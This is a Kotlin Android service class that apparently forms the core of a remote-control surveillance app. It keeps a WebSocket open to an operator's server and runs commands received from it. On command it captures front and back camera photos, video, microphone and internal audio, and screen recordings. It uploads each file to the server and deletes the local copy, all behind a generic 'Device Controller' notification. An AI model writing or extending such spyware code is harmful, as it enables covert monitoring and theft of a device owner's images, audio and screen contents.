package com.kashem.shaikh

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.File

class ForegroundService : LifecycleService() {

    private val channelId = "ForegroundServiceChannel"
    private val notificationId = 1
    private lateinit var webSocketManager: WebSocketManager
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var cameraManager: FrontCameraManager? = null
    private var videoRecorderManager: VideoRecorderManager? = null
    private var audioRecorderManager: AudioRecorderManager? = null

    // নোটিফিকেশন বারবার আপডেট হওয়া বন্ধ করতে
    private var lastConnectionStatus: Boolean? = null

    companion object {
        private var instance: ForegroundService? = null

        fun startFrontCamera(context: Context) { instance?.cameraManager?.startFrontCamera() }
        fun startBackCamera(context: Context) { instance?.cameraManager?.startBackCamera() }
        fun stopCamera(context: Context) { instance?.cameraManager?.stopCamera() }

        fun startVideoMain(context: Context) { instance?.videoRecorderManager?.startRecording(false) }
        fun startVideoSelfie(context: Context) { instance?.videoRecorderManager?.startRecording(true) }
        fun stopVideo(context: Context) { instance?.videoRecorderManager?.stopRecording() }

        fun startExternalAudio(context: Context, duration: Int) {
            instance?.audioRecorderManager?.startExternalRecording(duration)
        }
        fun startInternalAudio(context: Context, duration: Int) {
            instance?.audioRecorderManager?.startInternalRecording(duration)
        }
        fun stopAudio(context: Context) {
            instance?.audioRecorderManager?.stopRecording()
        }
        fun setMediaProjectionData(resultCode: Int, data: Intent) {
            instance?.audioRecorderManager?.setMediaProjection(resultCode, data)
        }

        fun startScreenRecord(context: Context) {
            ScreenRecorder.startRecording()
        }

        fun stopScreenRecord(context: Context) {
            ScreenRecorder.stopRecording()
        }

        fun setMediaProjectionForScreen(resultCode: Int, data: Intent) {
            ScreenRecorder.setMediaProjection(resultCode, data)
        }

        fun uploadScreenRecord(file: File) {
            instance?.uploadFile(file, "screen_record")
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForegroundService()
        initWebSocket()

        cameraManager = FrontCameraManager(applicationContext, this) { file ->
            uploadFile(file, "photo")
        }

        videoRecorderManager = VideoRecorderManager(applicationContext, this) { file ->
            uploadFile(file, "video")
        }

        audioRecorderManager = AudioRecorderManager(applicationContext) { file ->
            uploadFile(file, "audio")
        }
    }

    private fun uploadFile(file: File, type: String) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls != null) {
            val (host, _) = urls
            FileUploader.uploadFile(applicationContext, file, host) { success ->
                if (success) {
                    Log.d("ForegroundService", "$type uploaded: ${file.name}")
                    file.delete()
                } else {
                    Log.e("ForegroundService", "$type upload failed: ${file.name}")
                }
            }
        } else {
            Log.e("ForegroundService", "Config missing, cannot upload $type")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Foreground Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val intent = Intent(this, ForegroundService::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText("Running in background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(notificationId, notification)
    }

    private fun initWebSocket() {
        webSocketManager = WebSocketManager(applicationContext,
            onMessage = { message ->
                serviceScope.launch {
                    CommandProcessor.processCommand(message, applicationContext)
                }
            },
            onConnectionChange = { isConnected ->
                // শুধুমাত্র স্ট্যাটাস পরিবর্তন হলেই নোটিফিকেশন আপডেট করবে
                if (lastConnectionStatus != isConnected) {
                    lastConnectionStatus = isConnected
                    updateNotification(if (isConnected) "Connected" else "Disconnected")
                }
            }
        )
        webSocketManager.connect()
    }

    private fun updateNotification(text: String) {
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        getSystemService(NotificationManager::class.java).notify(notificationId, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        webSocketManager.disconnect()
        cameraManager?.stopCamera()
        videoRecorderManager?.release()
        audioRecorderManager?.release()
        instance = null
    }
}